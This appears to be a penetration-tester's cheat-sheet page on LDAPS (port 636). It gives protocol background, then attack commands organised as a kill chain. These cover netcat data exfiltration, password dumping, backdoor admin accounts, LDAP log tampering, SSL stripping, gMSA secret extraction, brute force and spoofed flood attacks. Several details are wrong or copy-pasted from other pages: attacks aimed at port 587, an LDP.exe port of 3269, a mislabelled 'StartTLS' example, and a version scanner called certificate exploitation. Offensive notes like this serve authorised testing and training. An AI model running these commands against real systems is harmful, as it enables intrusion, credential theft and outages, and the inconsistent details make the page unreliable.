# Index
- [[Ports, Protocols, and Services]]
	- [[P389 LDAP]]
	- [[P3269 LDAP Global Catalog]]

# Lightweight Directory Access Protocol Secure (LDAPS)

- **Port Number:** 636
- **Protocol:** TCP
- **Service Name:** LDAPS (LDAP over SSL/TLS)
- **Defined in:** RFC 4513, RFC 2830

Lightweight Directory Access Protocol Secure (LDAPS) is the secure version of LDAP, which is a protocol used for accessing and managing directory information services over a network. LDAPS adds a layer of security by encapsulating LDAP communication in SSL (Secure Sockets Layer) or TLS (Transport Layer Security) encryption, ensuring that all data exchanged between the client and the server is encrypted and protected from eavesdropping and tampering.

## Overview of Features

- **Encryption:** LDAPS uses SSL or TLS to encrypt LDAP traffic, protecting sensitive information such as usernames, passwords, and directory queries from being intercepted by unauthorized parties.
  
- **Authentication:** In addition to encryption, LDAPS supports various authentication mechanisms, including simple binds with SSL/TLS encryption and SASL (Simple Authentication and Security Layer) mechanisms for strong authentication.

- **Integrity:** LDAPS ensures data integrity by using cryptographic checksums to detect any alterations to the data during transmission.

- **Compatibility:** LDAPS is designed to be fully compatible with existing LDAP infrastructures, allowing organizations to enhance security without major changes to their directory services.

- **Certificate-Based Security:** LDAPS relies on X.509 certificates for establishing a secure connection, providing a strong foundation for verifying the identity of the LDAP server.

## Typical Use Cases

- **Secure Directory Access:** LDAPS is widely used in enterprise environments to securely access directory services for authentication, authorization, and information retrieval.
  
- **Single Sign-On (SSO) Systems:** LDAPS plays a crucial role in single sign-on systems, where it securely facilitates the authentication of users across multiple systems.

- **Active Directory:** In Microsoft environments, LDAPS is often used to secure communication with Active Directory, especially for external access or integration with other secure systems.

- **Secure Data Synchronization:** Organizations use LDAPS to securely synchronize directory data between multiple directory services or to external systems like email servers.

## How LDAPS Protocol Works

1. **TLS/SSL Handshake:**
   - **Step 1:** The client initiates a connection to the LDAP server on port 636.
   - **Step 2:** The server responds by providing its SSL/TLS certificate to the client.
   - **Step 3:** The client validates the server’s certificate using the trusted Certificate Authority (CA) certificates stored on the client’s system.
   - **Step 4:** If the certificate is valid, the client and server negotiate the encryption algorithms to be used during the session.
   - **Step 5:** A secure session is established, with the client and server exchanging encrypted data.

2. **LDAP Bind Operation:**
   - **Step 6:** The client sends a bind request to the server to authenticate the session, typically using a username and password.
   - **Step 7:** The server verifies the credentials and responds with a success or failure message.

3. **LDAP Search and Modify Operations:**
   - **Step 8:** Once authenticated, the client can send LDAP requests to search, retrieve, or modify directory entries. These operations are performed over the encrypted connection.
   - **Step 9:** The server processes the requests and sends back the results, all within the secure TLS/SSL session.

4. **TLS/SSL Session Termination:**
   - **Step 10:** After the LDAP operations are completed, the client and server can terminate the secure session. The client sends a `unbind` request, and the server acknowledges it.
   - **Step 11:** The TLS/SSL session is terminated, and the connection is closed.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` initiates a connection to `<target_ip>` on port 636.
- **Server:** `<target_ip>` sends its SSL certificate, and `<attack_ip>` validates it.
- **Client:** `<attack_ip>` sends a bind request with credentials.
- **Server:** `<target_ip>` authenticates the credentials and responds with directory data.

# Additional Information

## SSL/TLS Versions
LDAPS supports multiple versions of SSL/TLS, but it's recommended to use TLS 1.2 or higher due to vulnerabilities in earlier versions.

## StartTLS with LDAP
Another method for securing LDAP communication, where the connection starts on the standard LDAP port 389, and encryption is negotiated after the connection is established. While LDAPS uses a dedicated port (636) for secure communication, StartTLS allows for upgrading an existing insecure connection to a secure one on the standard port (389). However, LDAPS is often preferred for environments where security policies mandate dedicated secure ports.

## LDAP over SSL (LDAPS)
Directly starts with SSL/TLS over a dedicated port (636).

## SSL/TLS Configuration
Server and client configurations define the paths to certificate files, private keys, and trusted CA certificates.

## Common LDAP Directories

| **Directory**                          | **Description**                                                             |
|-|-|
| DC=mydomain,DC=com                      | Represents the root of the directory tree for the example.com domain.       |
| OU=Users,DC=mydomain,DC=com             | Organizational Unit containing user accounts within the example.com domain. |
| CN=John Doe,OU=Users,DC=mydomain,DC=com | A specific user entry (John Doe) within the Users organizational unit.      |
| OU=Groups,DC=mydomain,DC=com            | Organizational Unit containing group entries within the example.com domain. |
| CN=Admins,OU=Groups,DC=mydomain,DC=com  | A specific group entry (Admins) within the Groups organizational unit.      |

## Security Considerations
- **Certificate Management:** Proper certificate management is crucial for LDAPS security. Expired, untrusted, or misconfigured certificates can lead to failed connections or potential security risks.
  
- **Fallback to LDAP:** Some misconfigurations may allow a fallback to unencrypted LDAP (on port 389) if LDAPS fails, which can expose sensitive data.

- **Man-in-the-Middle (MitM) Attacks:** If an attacker can compromise a Certificate Authority or inject their own certificates, they could potentially intercept LDAPS traffic. Proper certificate pinning and monitoring are recommended to mitigate this risk.

## Alternatives
- **LDAP with StartTLS:** An alternative to LDAPS is using LDAP on port 389 with the StartTLS extension, which upgrades an unencrypted connection to a secure one. However, this method is less commonly used than LDAPS.
  
- **Kerberos Authentication:** In environments where LDAPS is not feasible or needed, Kerberos can be used for secure authentication within the network.

## Advanced Usage
- **Mutual TLS (mTLS):** Some deployments may require both the client and server to present certificates, known as mutual TLS. This provides an additional layer of security by ensuring both parties are authenticated.

## Modes of Operation
- **Anonymous Bind:** Although generally discouraged, LDAPS can be configured to allow anonymous bind operations, where clients do not need to authenticate to perform certain directory queries.
  
- **SASL Bind:** LDAPS can support SASL mechanisms for more complex authentication scenarios, such as Kerberos or NTLM integration, depending on the directory service's configuration.

## Configuration Files

### OpenLDAP LDAPS Configuration

1. **slapd.conf (deprecated):**
  - **File Location:** `/etc/openldap/slapd.conf`
  - **Configuration Example:**
    ```bash
    TLSCACertificateFile /etc/ssl/certs/ca-certificates.crt
    TLSCertificateFile /etc/ssl/certs/ldap-server.crt
    TLSCertificateKeyFile /etc/ssl/private/ldap-server.key
    ```
  - **Key Settings:**
    - `TLSCACertificateFile`: Specifies the location of the CA certificate to verify client certificates.
    - `TLSCertificateFile`: Specifies the LDAP server's certificate file.
    - `TLSCertificateKeyFile`: Specifies the private key corresponding to the server certificate.

2. **slapd.d Configuration:**
  - **File Location:** `/etc/openldap/slapd.d/`
  - **Configuration Example** (using `CN=config`):
    ```bash
    dn: CN=config
    objectClass: olcGlobal
    olcTLSCACertificateFile: /etc/ssl/certs/ca-certificates.crt
    olcTLSCertificateFile: /etc/ssl/certs/ldap-server.crt
    olcTLSCertificateKeyFile: /etc/ssl/private/ldap-server.key
    ```
  - **Key Settings:**
    - `olcTLSCACertificateFile`: Specifies the CA certificate for verifying client connections.
    - `olcTLSCertificateFile`: Path to the server’s SSL/TLS certificate.
    - `olcTLSCertificateKeyFile`: Path to the server’s private key.

### Microsoft Active Directory LDAPS Configuration

1. **Windows Registry:**
  - **File Location:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters`
  - **Configuration Example:**
    ```bash
    "LDAPServerIntegrity"=dword:00000001
    ```
  - **Key Settings:**
    - `LDAPServerIntegrity`: Enforces integrity checks on LDAP over SSL connections.

- **Certificate Management:**
  - Certificates for LDAPS on Windows are managed using the Certificate Management Console (`certmgr.msc`), where you can install and configure the necessary SSL/TLS certificates for the directory services.

## Potential Misconfigurations

1. **Expired or Invalid SSL Certificates:**
   - **Risk:** An expired or invalid SSL certificate can prevent clients from connecting securely to the LDAPS service.
   - **Exploitation:** Attackers may attempt to exploit this by performing a man-in-the-middle attack or forcing a downgrade to unencrypted LDAP.

2. **Weak Ciphers Enabled:**
   - **Risk:** If weak SSL/TLS ciphers are enabled, the encrypted communication may be vulnerable to attacks such as POODLE or BEAST.
   - **Exploitation:** Attackers can exploit these weaknesses to decrypt or alter the data in transit.

3. **Fallback to Unencrypted LDAP:**
   - **Risk:** If LDAPS fails and the service falls back to LDAP on port 389 without adequate safeguards, sensitive data could be transmitted in plaintext.
   - **Exploitation:** Attackers can intercept plaintext LDAP traffic to capture sensitive information, including credentials.

4. **Improper Certificate Validation:**
   - **Risk:** If clients do not properly validate the server’s certificate, they may be vulnerable to man-in-the-middle attacks.
   - **Exploitation:** An attacker could use a forged or compromised certificate to intercept and decrypt LDAPS traffic.

## Default Credentials

LDAPS itself does not define default credentials, as it is an encrypted transport layer for LDAP. However, the underlying LDAP service may have default credentials if not properly configured, such as:

- **OpenLDAP:**
  - Default Bind DN: `CN=admin,DC=mydomain,DC=com`
  - Default Password: `secret` (often configured during installation)

- **Microsoft Active Directory:**
  - Default Domain Administrator: `Administrator`
  - Default Password: Typically set during installation but could be a weak or known default in poorly managed environments.

# Interaction and Tools

## Tools

### [[LDAPAdd]]
- **Add Entry to the LDAP directory:** Add a new entry defined in the `new_entry.ldif` file.
	```bash
	ldapadd -H ldaps://<target_ip>:636 -D "<bind_dn>" -w '<password>' -f <filename>
	
	ldapadd -H ldaps://<target_ip>:636 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' -f new_entry.ldif
	```

### [[LDAPModify]]
- **Modify Entry in the LDAP directory:** Modify an existing entry using the `modify_entry.ldif` file.
	```bash
	ldapmodify -H ldaps://<target_ip>:636 -D "<bind_dn" -w '<password>' -f <filename>
	
	ldapmodify -H ldaps://<target_ip>:636 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' -f modify.ldif
	```

### [[LDAPDelete]]
- **Delete Entry from the LDAP directory:** Delete the entry with the common name "John Doe."
	```bash
	ldapdelete -H ldaps://<target_ip>:636 -D "<bind_dn>" -w '<password>' "<entry_to_delete>"
	
	ldapdelete -H ldaps://<target_ip>:636 -D "CN=admin,DC=mydomain,DC=com" -w 'password123' "CN=user,DC=mydomain,DC=com"
	```

### [[LDAPSearch]]
- **Anonymous Bind:** Attempts to enumerate the directory with an anonymous bind.
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "<searchbase_ou>"
	ldapsearch -H ldaps://<target_ip>:636 -b "DC=mydomain,DC=com" 
	```
- **Authenticated Bind:** Performs enumeration with authenticated access.
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -D '<domainname>\<username>' -w '<password>'
	ldapsearch -H ldaps://<target_ip>:636 -D 'mydomain\admin' -w 'password123'
	
	ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>'
	ldapsearch -H ldaps://<target_ip>:636 -D "CN=admin,DC=mydomain,DC=com" -w 'password123'
	```
- **Search Syntax:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -D '<domainname>\<username>' -w '<password>' -b "<searchbase_ou>" "<search_parameters>"
	
	ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>'
	```
- **Search Entries:** Searches for all entries under the base DN `DC=mydomain,DC=com`.
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "DC=mydomain,DC=com" "(objectClass=*)"
	```
- **Extract Users:**
	```bash	
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Users,DC=mydomain,DC=com"
	```
- **Extract Specific User:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Users,DC=mydomain,DC=com" "(uid=johndoe)"
	```
- **Extract Users in an Organizational Unit:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "OU=Users,DC=mydomain,DC=com" "(objectClass=inetOrgPerson)"
	```
- **Extract Computers:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Computers,DC=mydomain,DC=com"
	```
- **Extract my info:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=<username>,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Domain Admins:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Domain Admins,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Domain Users:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Domain Users,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Enterprise Admins:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Enterprise Admins,CN=Users,DC=mydomain,DC=com"
	```
- **Extract Administrators:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Administrators,CN=Builtin,DC=mydomain,DC=com"
	```
- **Extract Remote Desktop Group:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "CN=Remote Desktop Users,CN=Builtin,DC=mydomain,DC=com"
	```
- **To see if you have access to any password you can use grep after executing one of the queries:**
	```bash
	<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
	```
- **Retrieve specific attributes:**
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -b "DC=mydomain,DC=com" "(uid=johndoe)" cn mail
	```
- **Export Directory Entries:** Exports the entire directory subtree to an LDIF file over a secure LDAPS connection.
	```bash
	ldapsearch -H ldaps://<target_ip> -b "dc=mydomain,dc=com" > backup.ldif	
	```
- **StartTLS:** Performs an LDAP search over a StartTLS-encrypted connection.
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -ZZ -b "DC=mydomain,DC=com"
	```

### [[LDAPPasswd]]
- **Password Change over LDAPS:** Changes the password of an LDAP user over a secure LDAPS connection.
    ```bash
    ldappasswd -H ldaps://<target_ip>:636 -D '<domainname>\<username>' -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
    
    ldappasswd -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
    ```

### [[SlapPasswd]]
- **LDAP Password Hashing:** Generates a hashed password for secure storage in LDAP entries.
    ```bash
    slappasswd
    ```

### [[SlapCat]]
- **Exporting LDAP Entries:** Exports all entries in the LDAP directory to an LDIF file for backup purposes.
    ```bash
    slapcat -v -l backup.ldif
    ```

### [[SlapAdd]]
- **Importing LDAP Entries:** Imports entries from an LDIF file into the LDAP directory.
    ```bash
    slapadd -l backup.ldif
    ```

### [[OpenSSL]]
- **Testing LDAPS Configuration (Using OpenSSL):** Connects to the LDAPS server and displays the SSL/TLS certificates, useful for debugging certificate issues.
    ```bash
    openssl s_client -connect <target_ip>:636 -showcerts
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 636"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 636
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 636
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 636 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 636
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 636 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:636
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 636 -c 1
    ```

### [[CrackMapExec]]
- **Authentication:** Testing if account exist without Kerberos protocol
	```bash
	crackmapexec ldap <target_ip> -u <username_wordlist> -p '' -k
	```
- **Testing credentials:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>'
	crackmapexec ldap <target_ip> -u <username> -H '<ntlmhash>'
	```
- **Find Domain SID:**
	```bash
	crackmapexec ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
	
	LDAP        DC1.scrm.local  636    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
	LDAPS       DC1.scrm.local  636    DC1.scrm.local   [+] scrm.local\sqlsvc
	LDAPS       DC1.scrm.local  636    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200
	```
- **Unconstrained Delegation:** CrackMapExec allows you to retrieve the list of all computers et users with the flag TRUSTED_FOR_DELEGATION
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --trusted-for-delegation
	```
- **Admin Count:** adminCount Indicates that a given object has had its ACLs changed to a more secure value by the system because it was a member of one of the administrative groups (directly or transitively).
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --admin-count
	```
- **Machine Account Quota:** This module retrieves the MachineAccountQuota domain-level attribute. It's useful to check this value because by default it permits unprivileged users to attach up to 10 computers to an Active Directory (AD) domain.
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M maq
	```
- **Get user descriptions:** New LDAP module to look for password inside the user's description.
	- Three options are available:
		- FILTER: To look for a string inside the description
		- PASSWORDPOLICY: To look for password according to the complexity requirements of windows
		- MINLENGTH: Choose the minimum length of the password (may be obtained from `--pass-pol`)
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --kdchost <ip> -M get-desc-users
	```
- **Dump gMSA:** Extract gmsa credentials accounts. Using the protocol LDAP you can extract the password of a gMSA account if you have the right. LDAPS is required to retrieve the password, using the `--gmsa` LDAPS is automatically selected
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa
	```
- **Exploit ESC8 (adcs) List all PKI enrollment Server:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M adcs
	```
- **Exploit ESC8 (adcs) List all certificates inside a PKI:** 
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M adcs -o SERVER=xxxx
	```
- **Extract subnet:** Extract subnet over an active directory environment
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network -o ONLY_HOSTS=true
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M get-network -o ALL=true
	```
- **Check LDAP signing:** Using the module `ldap-checker` you can verify if ldap require channel binding or not
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' -M ldap-checker
	```
- **Read DACL right:** LDAP module that permits to read and export the DACLs of one or multiple objects! Read all the ACEs of the Administrator
	```bash
	crackmapexec ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
	```
- **Extract gMSA secrets:** Convert gSAM id, convert gmsa lsa to ntlm. CrackMapExec offers multiple choices when you find a gmsa account in the LSA
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
	```

	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
	```
- **Bloodhound Ingestor:** To ingest the data of the Active Directory
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --bloodhound --ns ip --collection All
	```

### [[BloodHound Cheat Sheet]]
- **Extract All:** Collect and visualize data from the Global Catalog to identify potential privilege escalation paths.
    ```powershell
    SharpHound -CollectionMethod All -LDAPOnly -DomainFQDN example.com
    ```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:636
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:636
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 636
	```

## Other Techniques

### [[JXplorer]]
- **Open JXplorer:** Allows for graphical interaction with LDAP directories, making it easier to browse and modify entries.
    ```bash
    jxplorer
    ```

### [[LDAPAdmin]]
- **Connecting to an LDAP Server:**
	1. Open LDAPAdmin.
	2. Go to `Connection > Connect`.
	3. Enter the server address, port (636), and select SSL.
	4. Enter the bind DN (e.g., `CN=admin,DC=mydomain,DC=com`) and password.
	5. Click `Connect`.
- **Browsing the Directory:**
	1. Expand the directory tree to browse organizational units and entries.
	2. Right-click on entries to view, modify, or delete them.
	3. Use the `Search` feature to find specific entries.

### [[LDP.exe]]
- **Connecting to an LDAP Server:**
	1. Open `LDP.exe`.
	2. Connect to the server: `Connection -> Connect...`
	    - Server: `yourdomaincontroller`
	    - Port: `3269`
	    - Check `SSL` for secure connection.
	3. Bind to the server: `Connection -> Bind...`
	    - Use a valid domain user credentials.

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 636
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 636
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Certificate Information Gathering
- **Tool:** [[OpenSSL]]
    ```bash
    openssl s_client -connect <target_ip>:636 -showcerts
    ```
- **Description:** Retrieves and displays the server’s certificate chain, useful for identifying the certificate authority and the strength of the encryption.

## Initial Access

### LDAPS Anonymous Bind
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldaps://<target_ip>:636 -b ""
    ```
- **Description:** Enumerates the LDAPS service by performing an anonymous bind and querying the root DSE.

### LDAP Injection
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(&(uid=*)(userPassword=*))"
    ```
- **Description:** Injects a malicious LDAP filter to try and extract sensitive information.

### Certificate Exploitation
- **Tool:** [[Metasploit]]
    ```bash
    msf > use auxiliary/scanner/ldap/ldap_version
    msf auxiliary(ldap_version) > set RHOSTS <target_ip>
    msf auxiliary(ldap_version) > set SSL true
    msf auxiliary(ldap_version) > run
    ```
- **Description:** Exploiting poorly configured or expired certificates to bypass security checks.

## Persistence

### Create User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_new_user.ldif
	```
- **Description:** Create a new user to the directory providing a backdoor for persistent access.

### Change Existing User Account Password
- **Tool:** [[LDAPPasswd]]
	```bash
	ldappasswd -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
	```
- **Description:** Modify an existing user account password for persistent access.

### Manipulate Existing User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f modify_user.ldif
	```
- **Description:** Modify existing user entries to create alternate access methods.

### Injecting Malicious Entries
- **Tool:** [[LDAPModify]]
    ```bash
    ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f malicious.ldif
    ```
- **Description:** Injecting persistent backdoor entries into the LDAP directory.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 636"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### SSL Strip Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    
    sslstrip -l 636
    ```
- **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

### LDAP Credential Harvesting
- **Tool:** [[LDAPSearch]]
    ```bash
   ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(uid=*)"
    ```
- **Description:** Attempts to enumerate user credentials from the LDAP directory.

### Password Dumping
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(objectClass=person)" userPassword
    ```
- **Description:** Dumps all user passwords stored in the LDAP directory.

### LDAPS Log Analysis
- **Tool:** Log Parsing Tools
	```bash
	grep -i "ldap" /var/log/auth.log
	```
- **Description:** Analyze logs for failed LDAPS authentication attempts, which might reveal usernames or other useful information.

## Privilege Escalation

### Create Admin Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_new_admin.ldif
	```
- **Description:** Create a new admin account to the directory providing a backdoor for privilege escalation.

### Change Existing Admin Account Password
- **Tool:** [[LDAPPasswd]]
	```bash
	ldappasswd -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -s '<newpassword>' "CN=user,DC=mydomain,DC=com"
	```
- **Description:** Modify an existing admin account password for privilege escalation.

### Manipulate Existing User Account
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f escalate_user.ldif
	```
- **Description:** Modify existing user entries to escalate privileges of a lower-privileged account.

## Internal Reconnaissance

### LDAP Enumeration
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(objectClass=*)"
    ```
- **Description:** Enumerating directory objects, groups, and permissions to map out internal network resources.

### Sudo Rules Enumeration
- **Tool:** [[LDAPSearch]]
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "ou=sudoers,dc=example,dc=com"
	``` 
- **Description:** Retrieve and analyze sudo rules stored in the directory to identify potential privilege escalation vectors.

## Lateral Movement, Pivoting, and Tunnelling

### Using LDAP for Lateral Movement
- **Tool:** [[LDAPModify]]
	```bash
	ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f add_service_account.ldif
	```
- **Description:** Adds a service account with privileges across multiple systems, facilitating lateral movement.

## Defense Evasion

### Using Obfuscated Queries
- **Tool:** [[LDAPSearch]]
	```bash
	ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "dc=example,dc=com" -LLL "(|(cn=*)(uid=*))"
	```
- **Description:** Use obfuscated LDAP queries to avoid detection by security monitoring tools.

### Modifying Logs via LDAP
- **Tool:** [[LDAPModify]]
```bash
ldapmodify -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -f modify_logs.ldif
```
- **Description:** Modifies or deletes LDAP logs to erase evidence of an attack or compromise.

## Data Exfiltration

### Exfiltrating Directory Data
- **Tool:** [[LDAPSearch]]
    ```bash
    ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" -LLL > exfil_data.ldif
    ```
- **Description:** Extracting sensitive directory data over a secure LDAPS connection.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 587 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s 587 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 587 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 587 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

